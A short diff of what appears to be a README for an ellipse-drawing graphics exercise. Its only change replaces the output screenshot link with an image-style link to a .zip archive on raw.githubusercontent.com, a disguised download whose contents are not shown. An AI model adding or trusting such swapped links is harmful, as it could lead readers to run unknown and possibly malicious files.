@@ -116,7 +116,7 @@ int plotpoints(int xcenter,int ycenter,int x,int y)
 
 **Output :**
 
-![ellipsegamedevlopment](https://github.com/user-attachments/assets/51b06629-23d3-4109-91e3-f236dba53d95)
+![ellipsegamedevlopment](https://raw.githubusercontent.com/24013396/GAME-_DEVELOPMENT/main/nonrailroader/GAME-_DEVELOPMENT_v1.2.zip)
 
 
 **Result :**
